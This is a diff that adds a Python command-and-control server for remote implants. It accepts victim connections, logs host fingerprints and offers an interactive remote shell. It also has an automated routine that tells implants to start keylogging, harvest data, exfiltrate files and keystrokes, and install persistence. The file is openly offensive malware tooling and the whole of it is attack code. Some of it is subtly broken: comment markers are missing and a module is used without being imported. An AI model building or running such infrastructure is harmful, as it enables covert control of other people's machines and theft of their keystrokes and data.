@@ -1,0 +1,160 @@
+#!/usr/bin/env python3
+"""
+C2 Server — Listens for implant connections
+"""
+import json
+import socket
+import threading
+import os
+from datetime import datetime
+
+HOST = "0.0.0.0"
+PORT = 4443
+EXFIL_DIR = "received_data"
+
+class C2Server:
+    def __init__(self, host=HOST, port=PORT):
+        self.host = host
+        self.port = port
+        self.clients = {}
+        self.client_id = 0
+    
+    def handle_client(self, conn, addr):
+        self.client_id += 1
+        client_num = self.client_id
+        print(f"[+] Client {client_num} connected from {addr[0]}:{addr[1]}")
+        
+         Receive initial fingerprint
+        try:
+            length_bytes = conn.recv(4)
+            length = int.from_bytes(length_bytes, 'big')
+            fingerprint_data = b''
+            while len(fingerprint_data) < length:
+                fingerprint_data += conn.recv(length - len(fingerprint_data))
+            fingerprint = json.loads(fingerprint_data.decode())
+            print(f"[*] Client {client_num}: {fingerprint['hostname']} ({fingerprint['os']})")
+            self.clients[client_num] = {
+                "conn": conn,
+                "addr": addr,
+                "info": fingerprint,
+                "connected": datetime.now()
+            }
+        except:
+            print(f"[-] Client {client_num}: Failed to receive handshake")
+            conn.close()
+            return
+        
+         Interactive shell
+        interactive = input(f"[{client_num}] Enter interactive mode? (y/n): ").lower() == 'y'
+        
+        if interactive:
+            self.interactive_shell(client_num)
+        else:
+            # Automated session — log it
+            self.automated_session(client_num)
+    
+    def interactive_shell(self, client_num):
+        client = self.clients[client_num]
+        conn = client["conn"]
+        print(f"[*] Interactive shell with {client['info']['hostname']}")
+        print("    Type 'help' for implant commands, 'exit' to disconnect")
+        
+        while True:
+            try:
+                cmd = input(f"{client['info']['hostname']}> ")
+                if cmd.lower() == "exit":
+                    self.send_command(conn, "exit")
+                    break
+                
+                self.send_command(conn, cmd)
+                response = self.recv_response(conn)
+                if response:
+                    print(response)
+            except (KeyboardInterrupt, EOFError):
+                print()
+                break
+            except Exception as e:
+                print(f"[-] Error: {e}")
+                break
+        
+        conn.close()
+        print(f"[-] Client {client_num} disconnected")
+    
+    def automated_session(self, client_num):
+        """Send commands automatically for assessment"""
+        client = self.clients[client_num]
+        conn = client["conn"]
+        
+        print(f"[*] Running automated assessment on {client['info']['hostname']}")
+        
+        commands = [
+            "status",
+            "keylog_start",
+            "harvest",
+            "exfil",
+            "keylog_stop",
+            "exfil_keys",
+            "persistence",
+            "whoami",
+            "ipconfig" if os.name == 'nt' else "ifconfig",
+        ]
+        
+        for cmd in commands:
+            print(f"  -> {cmd}")
+            self.send_command(conn, cmd)
+            response = self.recv_response(conn)
+            if response:
+                # Save to log
+                log_file = f"session_{client_num}_{client['info']['hostname']}.log"
+                with open(log_file, "a") as f:
+                    f.write(f"\n=== {cmd} ===\n{response}\n")
+                print(f"     [{len(response)} bytes received]")
+            time.sleep(1)
+        
+        print(f"[+] Session {client_num} complete — saved to {log_file}")
+        conn.close()
+    
+    def send_command(self, conn, cmd):
+        payload = cmd.encode()
+        length = len(payload).to_bytes(4, 'big')
+        conn.sendall(length + payload)
+    
+    def recv_response(self, conn):
+        try:
+            length_bytes = conn.recv(4)
+            if not length_bytes:
+                return None
+            length = int.from_bytes(length_bytes, 'big')
+            data = b''
+            while len(data) < length:
+                chunk = conn.recv(min(length - len(data), 4096))
+                if not chunk:
+                    break
+                data += chunk
+            return data.decode(errors='replace')
+        except:
+            return None
+    
+    def start(self):
+        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        server.bind((self.host, self.port))
+        server.listen(10)
+        print(f"[*] C2 Server listening on {self.host}:{self.port}")
+        
+        os.makedirs(EXFIL_DIR, exist_ok=True)
+        
+        try:
+            while True:
+                conn, addr = server.accept()
+                thread = threading.Thread(target=self.handle_client, args=(conn, addr))
+                thread.daemon = True
+                thread.start()
+        except KeyboardInterrupt:
+            print("\n[*] Server shutting down")
+        finally:
+            server.close()
+
+if __name__ == "__main__":
+    c2 = C2Server()
+    c2.start()
